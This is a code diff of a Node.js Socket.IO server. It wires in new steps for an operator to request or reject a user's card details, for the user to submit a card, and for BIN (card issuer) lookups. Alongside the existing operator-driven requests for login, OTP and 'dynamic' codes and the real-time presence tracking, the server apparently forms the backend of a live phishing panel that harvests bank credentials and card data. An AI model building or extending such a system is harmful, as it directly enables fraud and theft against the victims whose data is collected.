@@ -41,6 +41,14 @@ import { NodePresenceTimer } from "./adapters/outbound/timers/NodePresenceTimer.
 import { MarkInactiveLater } from "./core/application/usecases/MarkInactiveLater.js";
 import { SetPresence } from "./core/application/usecases/SetPresence.js";
 import { AdminRequestFinish } from "./core/application/usecases/AdminRequestFinish.js";
+import { AdminRequestCc } from "./core/application/usecases/AdminRequestCc.js";
+import { AdminRejectCc } from "./core/application/usecases/AdminRejectCc.js";
+import { UserSubmitCc } from "./core/application/usecases/UserSubmitCc.js";
+import { PrismaBinLookupRepository } from "./adapters/outbound/db/PrismaBinLookupRepository.js";
+import { ThirdPartyBinClient } from "./adapters/outbound/bin/ThirdPartyBinClient.js";
+import { BinLookupService } from "./adapters/outbound/bin/BinLookupService.js";
+import { prisma } from "./adapters/outbound/db/prismaClient.js";
+
 
 const PORT = Number(process.env.PORT || 3005);
 const ORIGIN1 = process.env.LARAVEL_ORIGIN1 || "http://192.168.1.26:8000";
@@ -62,6 +70,12 @@ const repo = new PrismaSessionRepository();
 const tokens = new JwtTokenService(process.env.NODE_JWT_SECRET!);
 const rt = new SocketIoGateway(io);
 
+
+// ✅ BIN cache-first
+const binRepo = new PrismaBinLookupRepository(prisma);
+const binRemote = new ThirdPartyBinClient(process.env.BIN_API_KEY!, process.env.BIN_API_URL!);
+const binLookupService = new BinLookupService(binRepo, binRemote);
+
 // ---- Use cases
 const createSession = new CreateSession(repo, tokens, rt);
 const getSession = new GetSession(repo);
@@ -77,6 +91,8 @@ const issueAdminToken = new IssueAdminToken(
 const adminBootstrap = new AdminBootstrap(repo, rt);
 const requestAuth = new AdminRequestAuth(repo, rt);
 const rejectAuth = new AdminRejectAuth(repo, rt);
+const requestCc = new AdminRequestCc(repo, rt);
+const rejectCc = new AdminRejectCc(repo, rt);
 const requestData = new AdminRequestData(repo, rt);
 const rejectData = new AdminRejectData(repo, rt);
 const requestDinamic = new AdminRequestDinamic(repo, rt);
@@ -88,6 +104,7 @@ const requestFinish = new AdminRequestFinish(repo, rt);
 /* user */
 
 const submitData = new UserSubmitData(repo, rt);
+const submitCc = new UserSubmitCc(repo, rt, binLookupService);
 const submitAuth = new UserSubmitAuth(repo, rt);
 const submitDinamic = new UserSubmitDinamic(repo, rt);
 const submitOtp = new UserSubmitOtp(repo, rt);
@@ -126,6 +143,8 @@ io.on("connection", async (socket) => {
       rejectData,
       requestAuth,
       rejectAuth,
+      requestCc,
+      rejectCc,
       requestDinamic,
       rejectDinamic,
       requestOtp,
@@ -142,7 +161,7 @@ io.on("connection", async (socket) => {
       markInactiveLater,
       inactiveDelayMs: 8000,
     });
-    registerUserHandlers(socket, { submitAuth, submitDinamic, submitOtp, userGetSession, submitData });
+    registerUserHandlers(socket, { userGetSession, submitData, submitCc, submitAuth, submitDinamic, submitOtp });
   }
 });
 
